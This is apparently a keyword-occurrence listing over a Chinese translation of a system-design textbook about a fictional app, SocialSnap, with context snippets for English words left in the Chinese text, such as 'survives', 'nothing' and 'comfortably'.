  c02_b10.md: ...Service → (publish "order placed" event to queue) → "Order confirmed"                                    ↓ (asynchronously)...

=== quadrillion (2 occurrences) ===
  c03_b02.md: ...B | | 2^40 | ~1 trillion | ~1 trillion | 1 TB | | 2^50 | ~1 quadrillion | ~1 quadrillion | 1 PB |  以及 10 的幂，对速率和计数很有用：  | 值 | 近似 |...
  c03_b02.md: ...rillion | ~1 trillion | 1 TB | | 2^50 | ~1 quadrillion | ~1 quadrillion | 1 PB |  以及 10 的幂，对速率和计数很有用：  | 值 | 近似 | 常用名称 | |---|---|-...

=== thousand (2 occurrences) ===
  c03_b02.md: ...幂 | 精确值 | 近似值 | 名称 | |---|---|---|---| | 2^10 | 1,024 | ~1 thousand | 1 KB | | 2^20 | 1,048,576 | ~1 million | 1 MB | | 2^30 |...
  c03_b02.md: ...0 的幂，对速率和计数很有用：  | 值 | 近似 | 常用名称 | |---|---|---| | 10^3 | 1 thousand | K | | 10^6 | 1 million | M | | 10^9 | 1 billion | B（字节时也可...

=== connect (2 occurrences) ===
  c03_b04.md: ...万 / 8000 = 2875 → 向上取整约 3000 台活跃服务器  Netflix 实际使用一个名为 Open Connect 的自定义 CDN，在 ISP 中部署了数千台服务器。这个估算得到了正确的数量级。...
  c19_b14.md: ...）。  **授权流程（OAuth 2.0 Authorization Code）：**  1. 用户点击第三方应用中的“Connect to SocialSnap”。 2. 应用把用户重定向到 `socialsnap.com/oauth/authoriz...

=== isp (2 occurrences) ===
  c03_b04.md: ...向上取整约 3000 台活跃服务器  Netflix 实际使用一个名为 Open Connect 的自定义 CDN，在 ISP 中部署了数千台服务器。这个估算得到了正确的数量级。...
  c19_b04.md: ...发送请求时，数据以数据包形式在互联网上传输。没有加密，用户与 SocialSnap 服务器之间的任何网络节点——他们的 ISP、咖啡店的 Wi-Fi 路由器、某处被入侵的路由器——都能读取这些数据包内容。这是**中间人攻击（man-in-the-...

=== nothing (2 occurrences) ===
  c03_b04.md: ...音 7. 调音师数量：60,000 / 1000 = 60 位  芝加哥的真实答案在 50–100 之间。费米法从几乎 nothing 开始，误差在 2 倍以内。  **把费米估算应用到系统设计：**  **例子：** Netflix 需要多少服务器来处...
  c08_b11.md: ...if already_sent:             return  # Idempotent: do nothing on duplicate          # Send the email         email_servic...

=== price (2 occurrences) ===
  c06_b02.md: ..."_id": "prod_001",       "name": "Classic Tee",       "price": 29.99,       "category": "apparel",       "attributes": {...
  c06_b02.md: ..."_id": "prod_002",       "name": "ProBook 15",       "price": 1299.99,       "category": "electronics",       "attribut...

=== product (2 occurrences) ===
  c06_b02.md: ...document）**——一个类似 JSON 的对象，包含该特定产品所需的任意字段。       // t-shirt product     {       "_id": "prod_001",       "name": "Classic Tee",...
  c06_b02.md: ..."material": "100% cotton"       }     }      // laptop product     {       "_id": "prod_002",       "name": "ProBook 15",...

=== iot (2 occurrences) ===
  c06_b04.md: ...到 10:00 之间的所有指标”就是单行范围扫描——极快。   #### 列族存储何时胜出  **时间序列数据：** IoT 传感器读数、应用指标、金融 tick 数据、事件日志。数据按时间顺序写入，按时间范围读取。  **高写入吞吐：** C...
  c06_b14.md: ...也不算错。  务实的默认在两种情况下会变成陷阱：  **1. 访问模式明显不匹配。** 如果你从一开始就构建时间序列 IoT 平台（启动负载就是每秒 50,000 次写入），选择 PostgreSQL 并计划“以后出问题再迁移到 Cassand...

=== disk (2 occurrences) ===
  c10_b03.md: ...存储卷：Amazon EBS（Elastic Block Store）、Google Cloud Persistent Disk、Azure Managed Disk * SAN（Storage Area Network）——呈现给服务器如同本地连...
  c10_b03.md: ...tic Block Store）、Google Cloud Persistent Disk、Azure Managed Disk * SAN（Storage Area Network）——呈现给服务器如同本地连接的块存储设备网络  **块存储特点：...

=== available (2 occurrences) ===
  c06_b06.md: ...#### 定义：BASE  **BASE** 代表 **Basically Available, Soft state, Eventually consistent（基本可用、软状态、最终一致）。**  * **基...
  c06_b06.md: ...Eventually consistent（基本可用、软状态、最终一致）。**  * **基本可用（Basically Available）：** 系统始终可用（没有“服务不可用”错误），但响应可能是旧的或基于部分数据。 * **软状态（Soft state...

=== eventually (2 occurrences) ===
  c06_b06.md: ...### 定义：BASE  **BASE** 代表 **Basically Available, Soft state, Eventually consistent（基本可用、软状态、最终一致）。**  * **基本可用（Basically Available）...
  c10_b14.md: ...新照片已在对象存储，但数据库仍指向旧照片。用户看到错误。缓存未失效。对象存储中的新照片成为“孤儿”——无人引用。一个 eventually 清理作业（列出没有对应数据库条目的对象存储 key）会删除它。这就是最终一致性的定义：对象存储和数据库暂时不一致，但后...

=== crm (2 occurrences) ===
  c06_b08.md: ...。给文档 schema 添加新字段是零停机非事件；给关系型数据库加列需要 schema 迁移。  需要注意的问题：如果 CRM 后来需要复杂的跨客户分析（“找出过去 30 天有通话录音且交易在第 3 阶段的所有客户”），文档存储可能吃力。许多 C...
  c06_b08.md: ...M 后来需要复杂的跨客户分析（“找出过去 30 天有通话录音且交易在第 3 阶段的所有客户”），文档存储可能吃力。许多 CRM 对在线应用用文档存储，再同步数据到关系型数据库或数据仓库做分析。  **Q2.** 用 plain 语言解释为什么图数...

=== geoadd (2 occurrences) ===
  c06_b10.md: ...omatically)   对“5km 内司机”查询，使用**带地理空间索引的 Redis**（Redis 原生支持 `GEOADD`、`GEORADIUS` 命令）。所有当前司机位置都能放进内存（50,000 名司机 × 约 100 字节 = 5 M...
  c06_b10.md: ...B）。`GEORADIUS` 复杂度为 O(N+log(M))，N 是结果数——对有界半径基本为常数时间。       GEOADD drivers 37.7749 -122.4194 "driver:123"     GEORADIUS driver...

=== zincrby (2 occurrences) ===
  c06_b11.md: ...rted set，有序集合）：**  帖子创建时，原子递增其 hashtag 在有序集合中的 score：       ZINCRBY trending_hashtags:2024-01-15 1 "#systemdesign"     ZINCRBY...
  c06_b11.md: ...ZINCRBY trending_hashtags:2024-01-15 1 "#systemdesign"     ZINCRBY trending_hashtags:2024-01-15 1 "#engineering"   取当天 Top 10...

=== css (2 occurrences) ===
  c07_b02.md: ...置策略  缓存可以放在系统的多个层。理解放置选项和理解缓存本身一样重要。   #### 客户端缓存  浏览器在本地存储 CSS、JavaScript 和图片文件的副本。当你再次访问网站，浏览器从本地磁盘提供静态资源，而不是重新下载。HTTP 缓存...
  c23_b05.md: ...水线执行多次转换：  1. **解析：** 从原始 HTML 提取干净文本。移除 HTML 标签、JavaScript、CSS。 2. **分词：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Distri...

=== survives (2 occurrences) ===
  c07_b03.md: ...和 Memcached 是典型例子。  所有应用服务器访问同一个缓存。一台服务器上的缓存命中为所有服务器预热缓存。缓存 survives 应用服务器重启。你可以独立于应用扩展缓存。  **收益：** 所有应用实例共享状态。缓存可水平扩展。 survives...
  c07_b03.md: ...survives 应用服务器重启。你可以独立于应用扩展缓存。  **收益：** 所有应用实例共享状态。缓存可水平扩展。 survives 应用重启。  **代价：** 访问缓存需要网络调用（LAN 上约 0.5–2ms）。缓存服务器成为新的依赖——如果它失...

=== invalidate (2 occurrences) ===
  c07_b04.md: ...写入新值：       1. Write the new value to the database     2. Invalidate (delete) the old cached value — OR — update it in the cache...
  c07_b07.md: ...SET bio = %s WHERE id = %s", [new_bio, user_id])          # Invalidate cache         redis.delete(f"user:{user_id}:profile")   **影...

=== flush (2 occurrences) ===
  c07_b05.md: ...(fast, in-memory)     2. Mark the entry as "dirty" (pending flush to database)     3. Return success immediately     4. [Back...
  c07_b05.md: ...3. Return success immediately     4. [Background process] Flush dirty entries to database at regular intervals   **收益：** 写入...

=== always (2 occurrences) ===
  c07_b05.md: ...3. Return success   **读取路径：**       1. Check cache — almost always a HIT (cache is always up to date)     2. On miss (first ac...
  c07_b05.md: ...取路径：**       1. Check cache — almost always a HIT (cache is always up to date)     2. On miss (first access or cache restart):...

=== dirty (2 occurrences) ===
  c07_b05.md: ...value to cache (fast, in-memory)     2. Mark the entry as "dirty" (pending flush to database)     3. Return success immediat...
  c07_b05.md: ...eturn success immediately     4. [Background process] Flush dirty entries to database at regular intervals   **收益：** 写入以缓存速度完...

=== success (2 occurrences) ===
  c07_b05.md: ...value to database     2. Write value to cache     3. Return success   **读取路径：**       1. Check cache — almost always a HIT (cac...
  c07_b05.md: ...entry as "dirty" (pending flush to database)     3. Return success immediately     4. [Background process] Flush dirty entries...

=== lfu (2 occurrences) ===
  c07_b06.md: ...端。“最近最少使用”端是驱逐候选。  **LRU 的代价：** 维护访问顺序结构给每次缓存操作增加开销。一种简化近似——LFU（Least Frequently Used，最少 frequently 使用）、随机驱逐或“近似 LRU”——可以减少...
  c07_b06.md: ...么最优。Redis 使用近似 LRU：采样一部分 key，在其中驱逐最近最少访问的。   #### 其他驱逐策略  **LFU（Least Frequently Used，最少频繁使用）：** 驱逐总访问次数最少的 key。当热度随时间稳定时比...

=== rdb (2 occurrences) ===
  c07_b07.md: ...，无竞态条件。非常适合浏览数、点赞数、session ID。  **持久化选项：** Redis 支持两种持久化模式——RDB 快照（定期完整快照到磁盘）和 AOF（Append-Only File，记录每条写入命令）。这使 Redis 在重启后...
  c22_b14.md: ...append-only log）。重启后 Redis 从快照重载。对频繁更新的 timeline 数据，每 60 秒 RDB 快照可能丢失最多 60 秒扇出写入。对 60 秒新鲜度 SLO，这是可接受的——恢复后用户可能看到 60 秒前的 fe...

=== first (2 occurrences) ===
  c07_b07.md: ...est         ↓     Application Server         ↓ (check cache first)     Redis Cache         ↓ (on miss only)     PostgreSQL Da...
  c07_b07.md: ...user_profile(user_id, new_bio):         # Write to database first         db.execute("UPDATE users SET bio = %s WHERE id = %s...

=== stale (2 occurrences) ===
  c07_b09.md: ...仍在服务。缓存从不会出现空档。这对可预先计算的数据（热门帖子、推荐结果）有效，但需要后台任务基础设施。  **方案 4：stale-while-revalidate 短路。** 服务陈旧的缓存值，同时触发异步缓存刷新。用户立即得到略旧的响应，而不是等...
  c07_b17.md: ...性和更高运维复杂度。这笔交易是否值得，取决于你的工作负载是否有让缓存有效的重复读取——以及用户能否容忍 TTL 允许的 stale 程度。  在第 8 章，我们将遇到一种不同的解耦系统部分机制：消息队列。如果说缓存把读路径与数据库解耦，消息队列则把事...

=== time (2 occurrences) ===
  c07_b11.md: ...** TTL 代表什么？在缓存新鲜度中起什么作用？TTL 设太短或太长有什么后果？  **答案：** TTL 代表 **Time-to-Live（生存时间）**。它是缓存条目视为过期并丢弃前的时长。过期条目被请求时，缓存返回未命中，应用从数据库取回...
  c19_b03.md: ...。PostScheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的（会过期）。如果 PostScheduler 被入侵，攻击者只获得 access token——它们...

=== userbioupdated (2 occurrences) ===
  c08_b06.md: ...Created(user_id=1, name="Alice", bio="Hello!")     Event 2: UserBioUpdated(user_id=1, new_bio="Software engineer at Acme")     Event 3...
  c08_b06.md: ...ser_id=1, new_bio="Software engineer at Acme")     Event 3: UserBioUpdated(user_id=1, new_bio="CTO at SocialSnap")   当前状态通过重放事件派生。当前简介...

=== connected (2 occurrences) ===
  c08_b07.md: ...← reads "user.signup" event from queue         ← notifies connected friends (200ms — doesn't block the user)   用户体验到瞬时注册（Postgr...
  c19_b14.md: ...如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问 SocialSnap 设置，看到“Connected Apps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 acce...

=== send (2 occurrences) ===
  c08_b11.md: ...return  # Idempotent: do nothing on duplicate          # Send the email         email_service.send_welcome_email(user_id)...
  c08_b11.md: ...return  # Idempotent: do nothing on duplicate          # Send the email         email_service.send_welcome_email(user_id)...

=== otp (2 occurrences) ===
  c08_b14.md: ...有效。如果已过期，生成新 token 或发送“你的重置链接已过期，请重新请求”消息。  **双因素认证码：** 6 位 OTP 通常有效期为 30 秒到 5 分钟。15 分钟队列积压使积压中的任何 OTP 通知完全无用。这类事件绝不应放入带延迟重...
  c08_b14.md: ...消息。  **双因素认证码：** 6 位 OTP 通常有效期为 30 秒到 5 分钟。15 分钟队列积压使积压中的任何 OTP 通知完全无用。这类事件绝不应放入带延迟重试的队列——它们应该同步处理（为时间关键动作绕过队列）或在过期后丢弃。  **...

=== kraft (2 occurrences) ===
  c08_b16.md: ...任何时刻队列深度最多几千条。迁移到 Kafka 需要规划分区数、调整保留期、监控磁盘使用、管理 ZooKeeper 或 KRaft 集群，并在基础设施上花费更多。当不需要保留和多消费者特性时，这种运维复杂度不合理。  原则：当你需要事件重放、多个独立...
  c28_b11.md: ...Ch 8) | 低（顺序磁盘写） | 分区内有序；跨消费者最终 | 极高——复制、持久化 | 高——Zookeeper/KRaft、分区管理 **Round-robin load balancing** (Ch 9) | 无延迟开销 | N/A |...

=== beta (2 occurrences) ===
  c09_b03.md: ...yload） * 把 `/api/search` 路由到搜索服务器集群（运行 Elasticsearch） * 把带 `Beta-User: true` 头的请求路由到 beta 应用服务器集群 * 把来自移动应用（`User-Agent: Soc...
  c09_b03.md: ...路由到搜索服务器集群（运行 Elasticsearch） * 把带 `Beta-User: true` 头的请求路由到 beta 应用服务器集群 * 把来自移动应用（`User-Agent: SocialSnapMobile`）的请求路由到为移动...

=== tld (2 occurrences) ===
  c09_b05.md: ...解析器查询根域名服务器（它们知道每个顶级域如 `.com` 的权威服务器）。 6. 根域名服务器指向 `.com` 的 TLD 域名服务器。 7. TLD 域名服务器指向 SocialSnap 的权威域名服务器（注册域名时配置）。 8. Soci...
  c09_b05.md: ...知道每个顶级域如 `.com` 的权威服务器）。 6. 根域名服务器指向 `.com` 的 TLD 域名服务器。 7. TLD 域名服务器指向 SocialSnap 的权威域名服务器（注册域名时配置）。 8. SocialSnap 的权威域名服务...

=== patch (2 occurrences) ===
  c09_b08.md: ...sfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、PUT、DELETE、PATCH）对由 URL 标识的资源表达 CRUD 操作。       GET  /users/42...
  c09_b08.md: ...T  /users/42                   → replace user 42's data     PATCH /users/42                  → partial update of user 42...

=== put (2 occurrences) ===
  c09_b08.md: ...State Transfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、PUT、DELETE、PATCH）对由 URL 标识的资源表达 CRUD 操作。       GET  /users/42...
  c09_b08.md: ...POST /users                      → create a new user     PUT  /users/42                   → replace user 42's data     P...

=== news (2 occurrences) ===
  c09_b08.md: ...QL：** 当许多不同客户端（Web、移动、第三方开发者）需要以不同形态获取相同底层数据时。例如 Facebook 的 news feed 在 Web、Android、iOS 上渲染不同——但底层数据（帖子、用户、互动）相同。GraphQL 让每个...
  c17_b06.md: ...单体架构（第 1 章）中，回答这个问题很容易：一个进程，一个日志文件。但到了第 13 章的微服务架构，单次用户请求加载 news feed 可能调用五个服务：  1. API Gateway——接收请求，通过 Auth Service 认证用户 2...

=== userservice (2 occurrences) ===
  c09_b09.md: ...格式，比 JSON 紧凑得多、解析更快。  gRPC 的 Protobuf 服务定义示例：       service UserService {       rpc GetUser (GetUserRequest) returns (User);...
  c09_b09.md: ...个定义，gRPC 自动生成多语言（Go、Python、Java、Node.js 等）的客户端和服务器代码。客户端调用 `userService.GetUser(request)` 并返回 `User` 对象——就像调用本地函数一样。  **gRPC 的优点：**...

=== string (2 occurrences) ===
  c09_b09.md: ...id = 1;     }      message User {       int64 id = 1;       string username = 2;       string bio = 3;     }   基于这个定义，gRPC 自动生...
  c09_b09.md: ...User {       int64 id = 1;       string username = 2;       string bio = 3;     }   基于这个定义，gRPC 自动生成多语言（Go、Python、Java、Node.js...

=== photourl (2 occurrences) ===
  c09_b14.md: ...query HomeFeed {       me {         username         photoUrl         followingCount         unreadNotificationCount...
  c09_b14.md: ...feed(limit: 20) {         postId         author { username photoUrl }         content         likeCount         createdAt...

=== heartbeat (2 occurrences) ===
  c09_b15.md: ...6.3 节）的合适工作负载。  **API 设计：**  两个端点：       POST /api/presence/heartbeat       → 需要认证。刷新 presence:{user_id} 的 TTL。返回 200。       → 活跃...
  c09_b15.md: ...t 消息发送——避免每个心跳都走完整 HTTP 请求-响应周期。WebSocket 服务器处理 `{ "type": "heartbeat" }` 消息，刷新 Redis TTL。这复用了现有 WebSocket 基础设施，而不是新增 HTTP 端点。  如...

=== online (2 occurrences) ===
  c09_b15.md: ...esence:{user_id}     Value: {last_seen: timestamp, status: "online"}     TTL:   5 minutes (300 seconds)   如果 presence key 存在，用...
  c09_b15.md: ...秒调用一次。      GET /api/users/{user_id}/presence       → 返回 { "online": true/false, "last_seen": "..." }       → 检查 Redis：EXISTS...

=== ebs (2 occurrences) ===
  c10_b03.md: ...遇到块存储：**  * 服务器中的物理磁盘（SATA SSD、NVMe SSD、HDD） * 云块存储卷：Amazon EBS（Elastic Block Store）、Google Cloud Persistent Disk、Azure Man...
  c10_b03.md: ...* 低延迟（尤其是 NVMe，通过 PCIe 总线直接连到 CPU） * 按特定卷大小分配（你配置“一个 500 GB EBS 卷”） * 快照备份（整个卷在一致时间点的副本）  PostgreSQL 把数据文件存在块存储上。当 PostgreS...

=== nas (2 occurrences) ===
  c10_b03.md: ...在目录中。这是你每天在桌面电脑上使用的存储模型。   #### 定义：文件存储  **文件存储**（也叫网络文件系统或 NAS——Network-Attached Storage）提供分层目录结构的命名文件，可通过网络访问。多个客户端可以同时挂载...
  c10_b03.md: ...亿（10 billion）小文件（例如缩略图）的文件系统，`ls` 命令和元数据操作会非常慢。 * **大规模：** NAS 系统有容量和吞吐限制，超过后需要集群方案。 * **地理分布：** 传统文件系统是单点的；从另一个数据中心访问会增加网...

=== nfs (2 occurrences) ===
  c10_b03.md: ...件系统。  **文件存储适用场景：**  * 跨多台服务器共享配置文件 * 多个系统写入的日志文件 * 共享应用数据的 NFS（Network File System）挂载 * 开发者工作站和协作工具  **文件存储对大规模系统的局限：**  文...
  c11_b03.md: ...B 和 C 可以读取。  原则上可行。实践中，这正是在重新发明分布式会话存储——而方案 3（正确答案）就提供这个。用 NFS 共享文件系统存会话数据很慢、运维脆弱，并增加新的单点故障。  正确做法是使用为此工作负载专门设计的键值存储——Redi...

=== column (2 occurrences) ===
  c10_b06.md: ...为 bytea（blob）列存在 PostgreSQL 中**       ALTER TABLE users ADD COLUMN profile_photo BYTEA;   这对少量用户有效。大规模下多方面失败：  * PostgreSQL 的...
  c28_b11.md: ...e (Redis)** (Ch 6, 7) | 极低（内存） | 最终（异步复制） | 高（集群模式） | 低–中 **Column-family store (Cassandra)** (Ch 6) | 低（写优化） | 可调（N/W/R quoru...

=== raw (2 occurrences) ===
  c10_b13.md: ...始视频**上传到对象存储**——完全绕过应用服务器。100 MB 视频上传不消耗应用服务器带宽。 4. 原始视频存于：`raw-uploads/user_42/video_abc123.mp4`。 5. 对象存储触发事件（通过 SNS/webho...
  c10_b13.md: ...": "video.uploaded",       "user_id": 42,       "raw_key": "raw-uploads/user_42/video_abc123.mp4",       "video_id": "vid_a...

=== uploaded (2 occurrences) ===
  c10_b13.md: ...4`。 5. 对象存储触发事件（通过 SNS/webhook），或上传完成信号通知应用服务器，服务器发布 `video.uploaded` 事件到消息队列（第 8 章）。  **转码路径（异步，通过消息队列）：**       消息队列事件：{...
  c10_b13.md: ...码路径（异步，通过消息队列）：**       消息队列事件：{       "event_type": "video.uploaded",       "user_id": 42,       "raw_key": "raw-uploads/user_4...

=== uploads (2 occurrences) ===
  c10_b13.md: ...*上传到对象存储**——完全绕过应用服务器。100 MB 视频上传不消耗应用服务器带宽。 4. 原始视频存于：`raw-uploads/user_42/video_abc123.mp4`。 5. 对象存储触发事件（通过 SNS/webhook），或上传完...
  c10_b13.md: ...video.uploaded",       "user_id": 42,       "raw_key": "raw-uploads/user_42/video_abc123.mp4",       "video_id": "vid_abc123"...

=== bigquery (2 occurrences) ===
  c10_b18.md: ...（Online Analytical Processing）数据库。例子：Amazon Redshift、Google BigQuery、Spark 或 Trino 查询的 Apache Parquet 文件、ClickHouse。  列式存储把每列单独写...
  c10_b18.md: ...fka 读取，把事件批量写成 Parquet 文件，每几分钟写入对象存储（S3）。 3. 分析数据库（Redshift、BigQuery 或 Athena）在查询时从 S3 读取 Parquet 文件，使用列式访问和谓词下推，在数秒内回答“#systemd...

=== clickhouse (2 occurrences) ===
  c10_b18.md: ...edshift、Google BigQuery、Spark 或 Trino 查询的 Apache Parquet 文件、ClickHouse。  列式存储把每列单独写。对上述查询，数据库只读取 `user_id`、`tags`、`country`、`times...
  c20_b06.md: ...大降低 10,000 倍。  分析数据库可用专门工具：Apache Kafka（队列） feeding  Apache Clickhouse 或数据仓库（分析存储）。用户通过分析 API 查询点击数，而不是查主数据库。  这种架构展示了第 8 章的原则：消息队...

=== events (2 occurrences) ===
  c10_b18.md: ...esign 且国家为 US 且时间戳在 30 天内的独立用户数”这类分析查询，PostgreSQL 必须读取 view events 表的每一行（或索引覆盖部分），然后在内存中过滤。每秒 50,000 事件 × 86,400 秒 × 30 天 = 约...
  c21_b03.md: ...接的延迟太高。对于不频繁的事件（每客户端每分钟少于一次）或容忍一定延迟的场景，HTTP 轮询或 Server-Sent Events（一种比 WebSocket 更简单的单向推送机制）可能更合适。WebSocket 有真实成本：每个连接消耗服务器端资源...

=== signature (2 occurrences) ===
  c11_b06.md: ...payload**（claims——会话数据：user_id、username、roles、过期时间） 3. 一个 **signature**（服务器用 secret key 生成的加密签名）  服务器在登录时签发 JWT：  1. 创建 payload：`...
  c19_b03.md: ...04070800,       "scope": "read:posts write:posts"     }   **Signature**：用服务器私钥对 header 和 payload 做的密码学签名。  完整 token 形如：`eyJhbGci....

=== comfortably (2 occurrences) ===
  c12_b05.md: ...大幅改善。每个 shard 处理八分之一的写负载。8 个 shard 下，每个主库现在大约处理每秒 625 次写入—— comfortably 在舒适范围内。  但部署几小时内，新问题出现。   ### 12.4 跨分片查询问题  团队想实现一个功能：“本周全球...
  c24_b03.md: ...段（10MB）16 秒下载完成，可用带宽约 5Mbps。 2. **为下一片段选择质量：** 选择最高质量级别，其码率 comfortably 低于可用带宽（留安全余量避免重新缓冲）。 3. **请求下一片段：** 下载所选片段。 4. **监控缓冲区健康：**...

=== slack (2 occurrences) ===
  c13_b10.md: ...团队的沟通模式塑造。  对 SocialSnap：如果公司有专门的支付团队、通知团队、用户资料团队——每个团队有自己的 Slack 频道、路线图和 on-call 轮值——他们产生的系统自然会有 Payment Service、Notificatio...
  c28_b01.md: ...。  现在想象一下，同样的系统由 8 个团队、每个团队 10 名工程师重新设计，每个团队在不同城市，通过每周会议和异步 Slack 消息沟通。同样的规格——但结果会很不同。组件将更加分离，接口将更加明确，集成点将有更清晰的文档。不是因为第二组更熟练（...

=== alex (2 occurrences) ===
  c13_b13.md: ...#### 深入思考  **Q1.** Sam 主张：“我们应该现在就拆成微服务，在出现扩展问题之前做好准备。”Alex 主张：“我们应该保持单体，直到扩展问题迫使我们拆分。”谁对？  **讨论：** 两种立场都捕捉了真实真相，正确答案取决...
  c13_b13.md: ...。上面描述的绞杀者迁移可行，但复杂且缓慢。如果你**知道**组织会成长且领域已充分理解，早拆可以避免未来痛苦的迁移。  Alex（等扩展问题）也有道理：过早分解的最大代价是服务边界搞错。在真正构建和运维之前你不会完全理解领域。如果拆分太早，会沿错误...

=== sam (2 occurrences) ===
  c13_b13.md: ...#### 深入思考  **Q1.** Sam 主张：“我们应该现在就拆成微服务，在出现扩展问题之前做好准备。”Alex 主张：“我们应该保持单体，直到扩展问题迫使我...
  c13_b13.md: ...应该保持单体，直到扩展问题迫使我们拆分。”谁对？  **讨论：** 两种立场都捕捉了真实真相，正确答案取决于上下文。  Sam（早拆）有道理：把大单体重构成微服务明显更难、风险更高，而从一开始就构建服务则不然。上面描述的绞杀者迁移可行，但复杂且缓...

=== riak (2 occurrences) ===
  c14_b04.md: ...rum——可调一致性  在“始终强一致”和“始终最终一致”之间有一系列可配置选项。Cassandra、DynamoDB、Riak 等分布式数据库允许你通过 **quorum** 机制按操作配置一致性级别。   #### 定义：复制因子  **复制因...
  c26_b07.md: ...值存储在生产规模可行，并给了行业一套具体机制（不只是原则）来实现它。  现代系统包括 Apache Cassandra、Riak 和 DynamoDB（托管云服务）都是 Dynamo 设计的直系后裔。当你在 SocialSnap 缓存中使用 Red...

=== floor (2 occurrences) ===
  c14_b05.md: ...Cassandra、DynamoDB（多种模式）和类似系统允许你按操作指定一致性级别：  * `QUORUM`：W=floor(N/2)+1，R=floor(N/2)+1——默认强一致性。 * `ONE`：W=1 或 R=1——最终一致性，最快速...
  c14_b05.md: ...amoDB（多种模式）和类似系统允许你按操作指定一致性级别：  * `QUORUM`：W=floor(N/2)+1，R=floor(N/2)+1——默认强一致性。 * `ONE`：W=1 或 R=1——最终一致性，最快速度。 * `LOCAL_QUO...

=== community (2 occurrences) ===
  c14_b12.md: ...突的重述场景：Marco 和 Elena 都是某个共享社区页面的管理员。Marco 在圣保罗把社区页面描述更新为 “A community for jazz lovers.”；Elena 在柏林把同一社区页面描述更新为 “A place for jazz e...
  c14_b12.md: ...ce for jazz enthusiasts.”。两次写入几乎同时在当地成功。数据中心互相复制时，两个节点发现同一个 community page 的 `description` 字段有不同值——真正的写冲突。  该场景下的解决选项：...

=== jazz (2 occurrences) ===
  c14_b12.md: ...Elena 都是某个共享社区页面的管理员。Marco 在圣保罗把社区页面描述更新为 “A community for jazz lovers.”；Elena 在柏林把同一社区页面描述更新为 “A place for jazz enthusiast...
  c14_b12.md: ...munity for jazz lovers.”；Elena 在柏林把同一社区页面描述更新为 “A place for jazz enthusiasts.”。两次写入几乎同时在当地成功。数据中心互相复制时，两个节点发现同一个 community p...

=== map (2 occurrences) ===
  c14_b13.md: ...计数器之和：本例中 1203 + 847 + 412 = 2462。每个数据中心从本地 per-data-center map 副本计算该总和。  收敛期间：数据中心定期互相复制它们的 per-data-center map。合并操作很简单——对...
  c14_b13.md: ...ata-center map 副本计算该总和。  收敛期间：数据中心定期互相复制它们的 per-data-center map。合并操作很简单——对每个数据中心计数器取最大值。如果 EU 节点有 `{"us-east": 1200, "eu-we...

=== undo (2 occurrences) ===
  c15_b05.md: ...不回滚——而是为已完成步骤运行“撤销”操作。  关键洞见：**补偿事务取代回滚**。单数据库里可以回滚，因为数据库维护 undo log。跨服务的分布式系统中没有共享 undo log。相反，你要设计显式操作，从语义上逆转已完成步骤的效果。  例如...
  c15_b05.md: ...关键洞见：**补偿事务取代回滚**。单数据库里可以回滚，因为数据库维护 undo log。跨服务的分布式系统中没有共享 undo log。相反，你要设计显式操作，从语义上逆转已完成步骤的效果。  例如，如果“信用卡扣款”成功，然后“更新用户为高级版...

=== charge (2 occurrences) ===
  c15_b07.md: ...COMMIT;     // Publish event to message queue: "payment.charge.succeeded"   数据库提交与事件发布之间存在空隙。如果服务在此间隙崩溃，支付记录已保存但事件从未发布。Sag...
  c15_b07.md: ...。  另一种顺序：       // Publish event to message queue: "payment.charge.succeeded"     BEGIN;         INSERT INTO payments (user_id...

=== succeeded (2 occurrences) ===
  c15_b07.md: ...MIT;     // Publish event to message queue: "payment.charge.succeeded"   数据库提交与事件发布之间存在空隙。如果服务在此间隙崩溃，支付记录已保存但事件从未发布。Saga 卡住——没有事件...
  c15_b07.md: ...序：       // Publish event to message queue: "payment.charge.succeeded"     BEGIN;         INSERT INTO payments (user_id, amount,...

=== social (2 occurrences) ===
  c15_b12.md: ...42, followed_id: 77, request_id: "req_a1b2c3"}`。  **第 1 步——Social Graph Service：** 监听 `follow.requested`。在 `friendships` 表中插入...
  c15_b12.md: ...果重试耗尽，编排器（或监控告警）把关注标记为失败。无需补偿——还没有任何变更。  如果第 2 步在第 1 步成功后失败：Social Graph Service 发布 `follow.graph.update.failed`。User Service...

=== compensating (2 occurrences) ===
  c15_b13.md: ...PENDING" | "USER_PENDING" | "EMAIL_PENDING" | "COMPLETE" | "COMPENSATING" | "FAILED"     payment_idempotency_key: "saga_7f3a9b2c_cha...
  c15_b13.md: ...r Service——超时或报错。编排器以指数退避重试最多 5 次。如果全部失败，转入 `current_step = COMPENSATING`。向 Payment Service 发起退款（幂等键 `saga_7f3a9b2c_refund`）以补偿扣款。记录...

=== result (2 occurrences) ===
  c15_b13.md: ...cy-Key: 7f3a9b2c-...`）。键由客户端控制，绑定到特定重试尝试，与请求体无关。服务器存储 key → result。客户端为每次不同操作生成新键，对同一操作的重试复用同一键。...
  c15_b14.md: ...cy-Key: 7f3a9b2c-...`）。键由客户端控制，绑定到特定重试尝试，与请求体无关。服务器存储 key → result。客户端为每次不同操作生成新键，对同一操作的重试复用同一键。...

=== patroni (2 occurrences) ===
  c16_b08.md: ...00ms，PostgreSQL：5 秒，支付处理器：30 秒）。没有调用会无限等待。  **通过 PostgreSQL Patroni 启用数据库自动故障转移。** 主库失败时，副本在 30 秒内被提升为主库。应用服务器配置连接池在故障转移后自动重连。...
  c16_b08.md: ...重连。  三周后，周四晚上 11:22，主 PostgreSQL 实例因磁盘失败故障。监控系统在 10 秒内检测到失败。Patroni 在 30 秒内提升副本。应用服务器在 5 秒内重连。数据库熔断器在故障转移窗口期间短暂打开，提供缓存响应。  用户可见...

=== checks (2 occurrences) ===
  c16_b15.md: ..."status": "healthy" | "degraded" | "unhealthy",       "checks": {         "database": {"status": "ok", "latency_ms": 2},...
  c28_b13.md: ...| 无延迟开销 | 部分——某些功能返回陈旧/空 | 极高——核心功能存活 | 中——需要降级逻辑 **Health checks** (Ch 16) | 无延迟开销 | N/A | 高——负载均衡器绕开故障 | 低 **Bulkhead patte...

=== healthy (2 occurrences) ===
  c16_b15.md: ...仍能服务 99% 请求——不应被标记为不健康。  **响应格式：**       {       "status": "healthy" | "degraded" | "unhealthy",       "checks": {         "dat...
